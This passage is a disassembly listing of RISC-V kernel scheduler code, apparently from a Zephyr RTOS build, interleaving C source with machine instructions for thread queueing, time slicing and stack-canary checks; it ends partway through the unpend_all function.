800052ae:	6105                	addi	sp,sp,32
800052b0:	8082                	ret
800052b2:	241000ef          	jal	ra,80005cf2 <_StackCheckHandler>

800052b6 <z_priq_dumb_best>:

struct k_thread *z_priq_dumb_best(sys_dlist_t *pq)
{
800052b6:	1101                	addi	sp,sp,-32
800052b8:	ce06                	sw	ra,28(sp)
800052ba:	87aa                	mv	a5,a0
800052bc:	8000c737          	lui	a4,0x8000c
800052c0:	95072683          	lw	a3,-1712(a4) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800052c4:	c636                	sw	a3,12(sp)
800052c6:	4681                	li	a3,0
	return list->head == list;
800052c8:	4108                	lw	a0,0(a0)
	return sys_dlist_is_empty(list) ? NULL : list->head;
800052ca:	00a78d63          	beq	a5,a0,800052e4 <z_priq_dumb_best+0x2e>

	if (n != NULL) {
		thread = CONTAINER_OF(n, struct k_thread, base.qnode_dlist);
	}
	return thread;
}
800052ce:	8000c7b7          	lui	a5,0x8000c
800052d2:	4732                	lw	a4,12(sp)
800052d4:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800052d8:	8fb9                	xor	a5,a5,a4
800052da:	4701                	li	a4,0
800052dc:	e791                	bnez	a5,800052e8 <z_priq_dumb_best+0x32>
800052de:	40f2                	lw	ra,28(sp)
800052e0:	6105                	addi	sp,sp,32
800052e2:	8082                	ret
	struct k_thread *thread = NULL;
800052e4:	4501                	li	a0,0
	return thread;
800052e6:	b7e5                	j	800052ce <z_priq_dumb_best+0x18>
}
800052e8:	20b000ef          	jal	ra,80005cf2 <_StackCheckHandler>

800052ec <update_cache>:
{
800052ec:	1101                	addi	sp,sp,-32
800052ee:	ce06                	sw	ra,28(sp)
800052f0:	cc22                	sw	s0,24(sp)
800052f2:	ca26                	sw	s1,20(sp)
800052f4:	84aa                	mv	s1,a0
800052f6:	8000c7b7          	lui	a5,0x8000c
800052fa:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800052fe:	c63a                	sw	a4,12(sp)
80005300:	4701                	li	a4,0
	return _priq_run_best(curr_cpu_runq());
80005302:	80009537          	lui	a0,0x80009
80005306:	53c50513          	addi	a0,a0,1340 # 8000953c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000953d>
8000530a:	3775                	jal	800052b6 <z_priq_dumb_best>
8000530c:	842a                	mv	s0,a0
	return (thread != NULL) ? thread : _current_cpu->idle_thread;
8000530e:	c51d                	beqz	a0,8000533c <update_cache+0x50>
	if (preempt_ok != 0) {
80005310:	ec85                	bnez	s1,80005348 <update_cache+0x5c>
	if (z_is_thread_prevented_from_running(_current)) {
80005312:	800097b7          	lui	a5,0x80009
80005316:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
8000531a:	4798                	lw	a4,8(a5)
	uint8_t state = thread->base.thread_state;
8000531c:	00d74783          	lbu	a5,13(a4)
80005320:	8bfd                	andi	a5,a5,31
80005322:	e39d                	bnez	a5,80005348 <update_cache+0x5c>
	return thread->base.preempt <= _PREEMPT_THRESHOLD;
80005324:	00e75683          	lhu	a3,14(a4)
	if (is_preempt(_current) || is_metairq(thread)) {
80005328:	07f00793          	li	a5,127
8000532c:	00d7fe63          	bgeu	a5,a3,80005348 <update_cache+0x5c>
		_kernel.ready_q.cache = _current;
80005330:	800097b7          	lui	a5,0x80009
80005334:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005338:	cf98                	sw	a4,24(a5)
8000533a:	a035                	j	80005366 <update_cache+0x7a>
	return (thread != NULL) ? thread : _current_cpu->idle_thread;
8000533c:	800097b7          	lui	a5,0x80009
80005340:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005344:	47c0                	lw	s0,12(a5)
80005346:	b7e9                	j	80005310 <update_cache+0x24>
		if (thread != _current) {
80005348:	800097b7          	lui	a5,0x80009
8000534c:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005350:	479c                	lw	a5,8(a5)
80005352:	00878563          	beq	a5,s0,8000535c <update_cache+0x70>
			z_reset_time_slice(thread);
80005356:	8522                	mv	a0,s0
80005358:	b27ff0ef          	jal	ra,80004e7e <z_reset_time_slice>
		_kernel.ready_q.cache = thread;
8000535c:	800097b7          	lui	a5,0x80009
80005360:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005364:	cf80                	sw	s0,24(a5)
}
80005366:	8000c7b7          	lui	a5,0x8000c
8000536a:	4732                	lw	a4,12(sp)
8000536c:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005370:	8fb9                	xor	a5,a5,a4
80005372:	4701                	li	a4,0
80005374:	e791                	bnez	a5,80005380 <update_cache+0x94>
80005376:	40f2                	lw	ra,28(sp)
80005378:	4462                	lw	s0,24(sp)
8000537a:	44d2                	lw	s1,20(sp)
8000537c:	6105                	addi	sp,sp,32
8000537e:	8082                	ret
80005380:	173000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80005384 <move_thread_to_end_of_prio_q>:
{
80005384:	1101                	addi	sp,sp,-32
80005386:	ce06                	sw	ra,28(sp)
80005388:	cc22                	sw	s0,24(sp)
8000538a:	ca26                	sw	s1,20(sp)
8000538c:	84aa                	mv	s1,a0
8000538e:	8000c7b7          	lui	a5,0x8000c
80005392:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005396:	c63a                	sw	a4,12(sp)
80005398:	4701                	li	a4,0
	return (thread->base.thread_state & state) != 0U;
8000539a:	00d54783          	lbu	a5,13(a0)
	if (z_is_thread_queued(thread)) {
8000539e:	01879713          	slli	a4,a5,0x18
800053a2:	8761                	srai	a4,a4,0x18
800053a4:	02074563          	bltz	a4,800053ce <move_thread_to_end_of_prio_q+0x4a>
	thread->base.thread_state |= _THREAD_QUEUED;
800053a8:	00d4c783          	lbu	a5,13(s1)
800053ac:	f807e793          	ori	a5,a5,-128
800053b0:	00f486a3          	sb	a5,13(s1)
	return list->head == list;
800053b4:	800097b7          	lui	a5,0x80009
800053b8:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800053bc:	4fc0                	lw	s0,28(a5)
	return sys_dlist_is_empty(list) ? NULL : list->head;
800053be:	800097b7          	lui	a5,0x80009
800053c2:	53c78793          	addi	a5,a5,1340 # 8000953c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000953d>
800053c6:	02f41763          	bne	s0,a5,800053f4 <move_thread_to_end_of_prio_q+0x70>
	SYS_DLIST_FOR_EACH_CONTAINER(pq, t, base.qnode_dlist) {
800053ca:	4401                	li	s0,0
800053cc:	a025                	j	800053f4 <move_thread_to_end_of_prio_q+0x70>
	thread->base.thread_state &= ~_THREAD_QUEUED;
800053ce:	07f7f793          	andi	a5,a5,127
800053d2:	00f506a3          	sb	a5,13(a0)
	_priq_run_remove(thread_runq(thread), thread);
800053d6:	85aa                	mv	a1,a0
800053d8:	80009537          	lui	a0,0x80009
800053dc:	53c50513          	addi	a0,a0,1340 # 8000953c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000953d>
800053e0:	e5bff0ef          	jal	ra,8000523a <z_priq_dumb_remove>
}
800053e4:	b7d1                	j	800053a8 <move_thread_to_end_of_prio_q+0x24>
	sys_dnode_t *const prev = successor->prev;
800053e6:	405c                	lw	a5,4(s0)
	node->prev = prev;
800053e8:	c0dc                	sw	a5,4(s1)
	node->next = successor;
800053ea:	c080                	sw	s0,0(s1)
	prev->next = node;
800053ec:	c384                	sw	s1,0(a5)
	successor->prev = node;
800053ee:	c044                	sw	s1,4(s0)
}
800053f0:	a081                	j	80005430 <move_thread_to_end_of_prio_q+0xac>
	SYS_DLIST_FOR_EACH_CONTAINER(pq, t, base.qnode_dlist) {
800053f2:	4401                	li	s0,0
800053f4:	c00d                	beqz	s0,80005416 <move_thread_to_end_of_prio_q+0x92>
		if (z_sched_prio_cmp(thread, t) > 0) {
800053f6:	85a2                	mv	a1,s0
800053f8:	8526                	mv	a0,s1
800053fa:	a49ff0ef          	jal	ra,80004e42 <z_sched_prio_cmp>
800053fe:	fea044e3          	bgtz	a0,800053e6 <move_thread_to_end_of_prio_q+0x62>
	return (node != NULL) ? sys_dlist_peek_next_no_check(list, node) : NULL;
80005402:	d86d                	beqz	s0,800053f4 <move_thread_to_end_of_prio_q+0x70>
	return (node == list->tail) ? NULL : node->next;
80005404:	800097b7          	lui	a5,0x80009
80005408:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
8000540c:	539c                	lw	a5,32(a5)
8000540e:	fef402e3          	beq	s0,a5,800053f2 <move_thread_to_end_of_prio_q+0x6e>
80005412:	4000                	lw	s0,0(s0)
80005414:	b7c5                	j	800053f4 <move_thread_to_end_of_prio_q+0x70>
	sys_dnode_t *const tail = list->tail;
80005416:	800097b7          	lui	a5,0x80009
8000541a:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
8000541e:	5394                	lw	a3,32(a5)
	node->next = list;
80005420:	80009737          	lui	a4,0x80009
80005424:	53c70713          	addi	a4,a4,1340 # 8000953c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000953d>
80005428:	c098                	sw	a4,0(s1)
	node->prev = tail;
8000542a:	c0d4                	sw	a3,4(s1)
	tail->next = node;
8000542c:	c284                	sw	s1,0(a3)
	list->tail = node;
8000542e:	d384                	sw	s1,32(a5)
	update_cache(thread == _current);
80005430:	800097b7          	lui	a5,0x80009
80005434:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005438:	4788                	lw	a0,8(a5)
8000543a:	8d05                	sub	a0,a0,s1
8000543c:	00153513          	seqz	a0,a0
80005440:	eadff0ef          	jal	ra,800052ec <update_cache>
}
80005444:	8000c7b7          	lui	a5,0x8000c
80005448:	4732                	lw	a4,12(sp)
8000544a:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000544e:	8fb9                	xor	a5,a5,a4
80005450:	4701                	li	a4,0
80005452:	e791                	bnez	a5,8000545e <move_thread_to_end_of_prio_q+0xda>
80005454:	40f2                	lw	ra,28(sp)
80005456:	4462                	lw	s0,24(sp)
80005458:	44d2                	lw	s1,20(sp)
8000545a:	6105                	addi	sp,sp,32
8000545c:	8082                	ret
8000545e:	095000ef          	jal	ra,80005cf2 <_StackCheckHandler>

80005462 <slice_expired_locked>:
{
80005462:	1101                	addi	sp,sp,-32
80005464:	ce06                	sw	ra,28(sp)
80005466:	cc22                	sw	s0,24(sp)
80005468:	ca26                	sw	s1,20(sp)
8000546a:	842a                	mv	s0,a0
8000546c:	8000c7b7          	lui	a5,0x8000c
80005470:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005474:	c63a                	sw	a4,12(sp)
80005476:	4701                	li	a4,0
	struct k_thread *curr = _current;
80005478:	800097b7          	lui	a5,0x80009
8000547c:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005480:	4784                	lw	s1,8(a5)
	uint8_t state = thread->base.thread_state;
80005482:	00d4c783          	lbu	a5,13(s1)
	if (!z_is_thread_prevented_from_running(curr)) {
80005486:	8bfd                	andi	a5,a5,31
80005488:	c395                	beqz	a5,800054ac <slice_expired_locked+0x4a>
	z_reset_time_slice(curr);
8000548a:	8526                	mv	a0,s1
8000548c:	9f3ff0ef          	jal	ra,80004e7e <z_reset_time_slice>
}
80005490:	8000c7b7          	lui	a5,0x8000c
80005494:	4732                	lw	a4,12(sp)
80005496:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000549a:	8fb9                	xor	a5,a5,a4
8000549c:	4701                	li	a4,0
8000549e:	eb99                	bnez	a5,800054b4 <slice_expired_locked+0x52>
800054a0:	8522                	mv	a0,s0
800054a2:	40f2                	lw	ra,28(sp)
800054a4:	4462                	lw	s0,24(sp)
800054a6:	44d2                	lw	s1,20(sp)
800054a8:	6105                	addi	sp,sp,32
800054aa:	8082                	ret
		move_thread_to_end_of_prio_q(curr);
800054ac:	8526                	mv	a0,s1
800054ae:	ed7ff0ef          	jal	ra,80005384 <move_thread_to_end_of_prio_q>
800054b2:	bfe1                	j	8000548a <slice_expired_locked+0x28>
}
800054b4:	03f000ef          	jal	ra,80005cf2 <_StackCheckHandler>

800054b8 <z_time_slice>:
{
800054b8:	1101                	addi	sp,sp,-32
800054ba:	ce06                	sw	ra,28(sp)
800054bc:	cc22                	sw	s0,24(sp)
800054be:	ca26                	sw	s1,20(sp)
800054c0:	c84a                	sw	s2,16(sp)
800054c2:	892a                	mv	s2,a0
800054c4:	8000c7b7          	lui	a5,0x8000c
800054c8:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800054cc:	c63a                	sw	a4,12(sp)
800054ce:	4701                	li	a4,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
800054d0:	300474f3          	csrrci	s1,mstatus,8
800054d4:	8426                	mv	s0,s1
	if (slice_time(_current) && sliceable(_current)) {
800054d6:	800097b7          	lui	a5,0x80009
800054da:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800054de:	4788                	lw	a0,8(a5)
	int ret = slice_ticks;
800054e0:	800097b7          	lui	a5,0x80009
800054e4:	04c7a783          	lw	a5,76(a5) # 8000904c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000904d>
	if (slice_time(_current) && sliceable(_current)) {
800054e8:	cb85                	beqz	a5,80005518 <z_time_slice+0x60>
800054ea:	857ff0ef          	jal	ra,80004d40 <sliceable>
800054ee:	c50d                	beqz	a0,80005518 <z_time_slice+0x60>
		if (ticks >= _current_cpu->slice_ticks) {
800054f0:	800097b7          	lui	a5,0x80009
800054f4:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800054f8:	4b9c                	lw	a5,16(a5)
800054fa:	00f95a63          	bge	s2,a5,8000550e <z_time_slice+0x56>
			_current_cpu->slice_ticks -= ticks;
800054fe:	80009737          	lui	a4,0x80009
80005502:	412787b3          	sub	a5,a5,s2
80005506:	52070713          	addi	a4,a4,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
8000550a:	cb1c                	sw	a5,16(a4)
8000550c:	a821                	j	80005524 <z_time_slice+0x6c>
			key = slice_expired_locked(key);
8000550e:	8526                	mv	a0,s1
80005510:	f53ff0ef          	jal	ra,80005462 <slice_expired_locked>
80005514:	842a                	mv	s0,a0
80005516:	a039                	j	80005524 <z_time_slice+0x6c>
		_current_cpu->slice_ticks = 0;
80005518:	800097b7          	lui	a5,0x80009
8000551c:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005520:	0007a823          	sw	zero,16(a5)
			  : "r" (key & MSTATUS_IEN)
80005524:	8821                	andi	s0,s0,8
	__asm__ volatile ("csrs mstatus, %0"
80005526:	30042073          	csrs	mstatus,s0
}
8000552a:	8000c7b7          	lui	a5,0x8000c
8000552e:	4732                	lw	a4,12(sp)
80005530:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005534:	8fb9                	xor	a5,a5,a4
80005536:	4701                	li	a4,0
80005538:	e799                	bnez	a5,80005546 <z_time_slice+0x8e>
8000553a:	40f2                	lw	ra,28(sp)
8000553c:	4462                	lw	s0,24(sp)
8000553e:	44d2                	lw	s1,20(sp)
80005540:	4942                	lw	s2,16(sp)
80005542:	6105                	addi	sp,sp,32
80005544:	8082                	ret
80005546:	7ac000ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000554a <ready_thread>:
{
8000554a:	1101                	addi	sp,sp,-32
8000554c:	ce06                	sw	ra,28(sp)
8000554e:	cc22                	sw	s0,24(sp)
80005550:	ca26                	sw	s1,20(sp)
80005552:	c84a                	sw	s2,16(sp)
80005554:	8000c7b7          	lui	a5,0x8000c
80005558:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000555c:	c63a                	sw	a4,12(sp)
8000555e:	4701                	li	a4,0
	return (thread->base.thread_state & state) != 0U;
80005560:	00d54783          	lbu	a5,13(a0)
	if (!z_is_thread_queued(thread) && z_is_thread_ready(thread)) {
80005564:	01879713          	slli	a4,a5,0x18
80005568:	8761                	srai	a4,a4,0x18
8000556a:	00074a63          	bltz	a4,8000557e <ready_thread+0x34>
8000556e:	842a                	mv	s0,a0
	return !((z_is_thread_prevented_from_running(thread)) != 0U ||
80005570:	01f7f713          	andi	a4,a5,31
80005574:	e709                	bnez	a4,8000557e <ready_thread+0x34>
	return node->next != NULL;
80005576:	01852903          	lw	s2,24(a0)
8000557a:	02090063          	beqz	s2,8000559a <ready_thread+0x50>
}
8000557e:	8000c7b7          	lui	a5,0x8000c
80005582:	4732                	lw	a4,12(sp)
80005584:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005588:	8fb9                	xor	a5,a5,a4
8000558a:	4701                	li	a4,0
8000558c:	e3c9                	bnez	a5,8000560e <ready_thread+0xc4>
8000558e:	40f2                	lw	ra,28(sp)
80005590:	4462                	lw	s0,24(sp)
80005592:	44d2                	lw	s1,20(sp)
80005594:	4942                	lw	s2,16(sp)
80005596:	6105                	addi	sp,sp,32
80005598:	8082                	ret
	thread->base.thread_state |= _THREAD_QUEUED;
8000559a:	f807e793          	ori	a5,a5,-128
8000559e:	00f506a3          	sb	a5,13(a0)
	return list->head == list;
800055a2:	800097b7          	lui	a5,0x80009
800055a6:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800055aa:	4fc4                	lw	s1,28(a5)
	return sys_dlist_is_empty(list) ? NULL : list->head;
800055ac:	800097b7          	lui	a5,0x80009
800055b0:	53c78793          	addi	a5,a5,1340 # 8000953c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000953d>
800055b4:	00f49b63          	bne	s1,a5,800055ca <ready_thread+0x80>
	SYS_DLIST_FOR_EACH_CONTAINER(pq, t, base.qnode_dlist) {
800055b8:	84ca                	mv	s1,s2
800055ba:	a801                	j	800055ca <ready_thread+0x80>
	sys_dnode_t *const prev = successor->prev;
800055bc:	40dc                	lw	a5,4(s1)
	node->prev = prev;
800055be:	c05c                	sw	a5,4(s0)
	node->next = successor;
800055c0:	c004                	sw	s1,0(s0)
	prev->next = node;
800055c2:	c380                	sw	s0,0(a5)
	successor->prev = node;
800055c4:	c0c0                	sw	s0,4(s1)
}
800055c6:	a081                	j	80005606 <ready_thread+0xbc>
800055c8:	84ca                	mv	s1,s2
800055ca:	c08d                	beqz	s1,800055ec <ready_thread+0xa2>
		if (z_sched_prio_cmp(thread, t) > 0) {
800055cc:	85a6                	mv	a1,s1
800055ce:	8522                	mv	a0,s0
800055d0:	873ff0ef          	jal	ra,80004e42 <z_sched_prio_cmp>
800055d4:	fea044e3          	bgtz	a0,800055bc <ready_thread+0x72>
	return (node != NULL) ? sys_dlist_peek_next_no_check(list, node) : NULL;
800055d8:	d8ed                	beqz	s1,800055ca <ready_thread+0x80>
	return (node == list->tail) ? NULL : node->next;
800055da:	800097b7          	lui	a5,0x80009
800055de:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800055e2:	539c                	lw	a5,32(a5)
800055e4:	fef482e3          	beq	s1,a5,800055c8 <ready_thread+0x7e>
800055e8:	4084                	lw	s1,0(s1)
800055ea:	b7c5                	j	800055ca <ready_thread+0x80>
	sys_dnode_t *const tail = list->tail;
800055ec:	800097b7          	lui	a5,0x80009
800055f0:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800055f4:	5394                	lw	a3,32(a5)
	node->next = list;
800055f6:	80009737          	lui	a4,0x80009
800055fa:	53c70713          	addi	a4,a4,1340 # 8000953c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000953d>
800055fe:	c018                	sw	a4,0(s0)
	node->prev = tail;
80005600:	c054                	sw	a3,4(s0)
	tail->next = node;
80005602:	c280                	sw	s0,0(a3)
	list->tail = node;
80005604:	d380                	sw	s0,32(a5)
		update_cache(0);
80005606:	4501                	li	a0,0
80005608:	ce5ff0ef          	jal	ra,800052ec <update_cache>
}
8000560c:	bf8d                	j	8000557e <ready_thread+0x34>
8000560e:	25d5                	jal	80005cf2 <_StackCheckHandler>

80005610 <z_ready_thread>:
{
80005610:	1101                	addi	sp,sp,-32
80005612:	ce06                	sw	ra,28(sp)
80005614:	cc22                	sw	s0,24(sp)
80005616:	ca26                	sw	s1,20(sp)
80005618:	842a                	mv	s0,a0
8000561a:	8000c7b7          	lui	a5,0x8000c
8000561e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005622:	c63a                	sw	a4,12(sp)
80005624:	4701                	li	a4,0
	LOCKED(&sched_spinlock) {
80005626:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80005628:	300474f3          	csrrci	s1,mstatus,8
8000562c:	a031                	j	80005638 <z_ready_thread+0x28>
			  : "r" (key & MSTATUS_IEN)
8000562e:	0084f793          	andi	a5,s1,8
	__asm__ volatile ("csrs mstatus, %0"
80005632:	3007a073          	csrs	mstatus,a5
80005636:	4785                	li	a5,1
80005638:	eb89                	bnez	a5,8000564a <z_ready_thread+0x3a>
		if (!thread_active_elsewhere(thread)) {
8000563a:	8522                	mv	a0,s0
8000563c:	f70ff0ef          	jal	ra,80004dac <thread_active_elsewhere>
80005640:	f57d                	bnez	a0,8000562e <z_ready_thread+0x1e>
			ready_thread(thread);
80005642:	8522                	mv	a0,s0
80005644:	f07ff0ef          	jal	ra,8000554a <ready_thread>
80005648:	b7dd                	j	8000562e <z_ready_thread+0x1e>
}
8000564a:	8000c7b7          	lui	a5,0x8000c
8000564e:	4732                	lw	a4,12(sp)
80005650:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005654:	8fb9                	xor	a5,a5,a4
80005656:	4701                	li	a4,0
80005658:	e791                	bnez	a5,80005664 <z_ready_thread+0x54>
8000565a:	40f2                	lw	ra,28(sp)
8000565c:	4462                	lw	s0,24(sp)
8000565e:	44d2                	lw	s1,20(sp)
80005660:	6105                	addi	sp,sp,32
80005662:	8082                	ret
80005664:	2579                	jal	80005cf2 <_StackCheckHandler>

80005666 <z_sched_start>:
{
80005666:	1101                	addi	sp,sp,-32
80005668:	ce06                	sw	ra,28(sp)
8000566a:	cc22                	sw	s0,24(sp)
8000566c:	8000c7b7          	lui	a5,0x8000c
80005670:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005674:	c63a                	sw	a4,12(sp)
80005676:	4701                	li	a4,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80005678:	30047473          	csrrci	s0,mstatus,8
	return (thread->base.thread_state & _THREAD_PRESTART) == 0U;
8000567c:	00d54783          	lbu	a5,13(a0)
	if (z_has_thread_started(thread)) {
80005680:	0047f713          	andi	a4,a5,4
80005684:	e305                	bnez	a4,800056a4 <z_sched_start+0x3e>
	__asm__ volatile ("csrs mstatus, %0"
80005686:	8821                	andi	s0,s0,8
80005688:	30042073          	csrs	mstatus,s0
}
8000568c:	8000c7b7          	lui	a5,0x8000c
80005690:	4732                	lw	a4,12(sp)
80005692:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005696:	8fb9                	xor	a5,a5,a4
80005698:	4701                	li	a4,0
8000569a:	e395                	bnez	a5,800056be <z_sched_start+0x58>
8000569c:	40f2                	lw	ra,28(sp)
8000569e:	4462                	lw	s0,24(sp)
800056a0:	6105                	addi	sp,sp,32
800056a2:	8082                	ret
	thread->base.thread_state &= ~_THREAD_PRESTART;
800056a4:	9bed                	andi	a5,a5,-5
800056a6:	00f506a3          	sb	a5,13(a0)
	ready_thread(thread);
800056aa:	ea1ff0ef          	jal	ra,8000554a <ready_thread>
	z_reschedule(&sched_spinlock, key);
800056ae:	85a2                	mv	a1,s0
800056b0:	80009537          	lui	a0,0x80009
800056b4:	54450513          	addi	a0,a0,1348 # 80009544 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009545>
800056b8:	ae7ff0ef          	jal	ra,8000519e <z_reschedule>
800056bc:	bfc1                	j	8000568c <z_sched_start+0x26>
}
800056be:	2d15                	jal	80005cf2 <_StackCheckHandler>

800056c0 <z_thread_timeout>:
{
800056c0:	1101                	addi	sp,sp,-32
800056c2:	ce06                	sw	ra,28(sp)
800056c4:	cc22                	sw	s0,24(sp)
800056c6:	ca26                	sw	s1,20(sp)
800056c8:	c84a                	sw	s2,16(sp)
800056ca:	842a                	mv	s0,a0
800056cc:	8000c7b7          	lui	a5,0x8000c
800056d0:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800056d4:	c63a                	sw	a4,12(sp)
800056d6:	4701                	li	a4,0
	struct k_thread *thread = CONTAINER_OF(timeout,
800056d8:	fe850913          	addi	s2,a0,-24
	LOCKED(&sched_spinlock) {
800056dc:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
800056de:	300474f3          	csrrci	s1,mstatus,8
800056e2:	a015                	j	80005706 <z_thread_timeout+0x46>
800056e4:	ff544783          	lbu	a5,-11(s0)
800056e8:	ffb7f713          	andi	a4,a5,-5
800056ec:	fee40aa3          	sb	a4,-11(s0)
	thread->base.thread_state &= ~_THREAD_SUSPENDED;
800056f0:	9bad                	andi	a5,a5,-21
800056f2:	fef40aa3          	sb	a5,-11(s0)
			ready_thread(thread);
800056f6:	854a                	mv	a0,s2
800056f8:	e53ff0ef          	jal	ra,8000554a <ready_thread>
			  : "r" (key & MSTATUS_IEN)
800056fc:	0084f793          	andi	a5,s1,8
	__asm__ volatile ("csrs mstatus, %0"
80005700:	3007a073          	csrs	mstatus,a5
	LOCKED(&sched_spinlock) {
80005704:	4785                	li	a5,1
80005706:	ef89                	bnez	a5,80005720 <z_thread_timeout+0x60>
		bool killed = ((thread->base.thread_state & _THREAD_DEAD) ||
80005708:	ff544783          	lbu	a5,-11(s0)
		if (!killed) {
8000570c:	0287f793          	andi	a5,a5,40
80005710:	f7f5                	bnez	a5,800056fc <z_thread_timeout+0x3c>
			if (thread->base.pended_on != NULL) {
80005712:	ff042783          	lw	a5,-16(s0)
80005716:	d7f9                	beqz	a5,800056e4 <z_thread_timeout+0x24>
				unpend_thread_no_timeout(thread);
80005718:	854a                	mv	a0,s2
8000571a:	b57ff0ef          	jal	ra,80005270 <unpend_thread_no_timeout>
8000571e:	b7d9                	j	800056e4 <z_thread_timeout+0x24>
}
80005720:	8000c7b7          	lui	a5,0x8000c
80005724:	4732                	lw	a4,12(sp)
80005726:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000572a:	8fb9                	xor	a5,a5,a4
8000572c:	4701                	li	a4,0
8000572e:	e799                	bnez	a5,8000573c <z_thread_timeout+0x7c>
80005730:	40f2                	lw	ra,28(sp)
80005732:	4462                	lw	s0,24(sp)
80005734:	44d2                	lw	s1,20(sp)
80005736:	4942                	lw	s2,16(sp)
80005738:	6105                	addi	sp,sp,32
8000573a:	8082                	ret
8000573c:	2b5d                	jal	80005cf2 <_StackCheckHandler>

8000573e <unpend_all>:
}

#endif /* CONFIG_SCHED_CPU_MASK */

static inline void unpend_all(_wait_q_t *wait_q)
{
8000573e:	1101                	addi	sp,sp,-32
80005740:	ce06                	sw	ra,28(sp)
80005742:	cc22                	sw	s0,24(sp)
80005744:	ca26                	sw	s1,20(sp)
80005746:	84aa                	mv	s1,a0
80005748:	8000c7b7          	lui	a5,0x8000c
8000574c:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005750:	c63a                	sw	a4,12(sp)
80005752:	4701                	li	a4,0
	return list->head == list;
80005754:	4080                	lw	s0,0(s1)
	return sys_dlist_is_empty(list) ? NULL : list->head;
80005756:	02848063          	beq	s1,s0,80005776 <unpend_all+0x38>
	struct k_thread *thread;

	while ((thread = z_waitq_head(wait_q)) != NULL) {
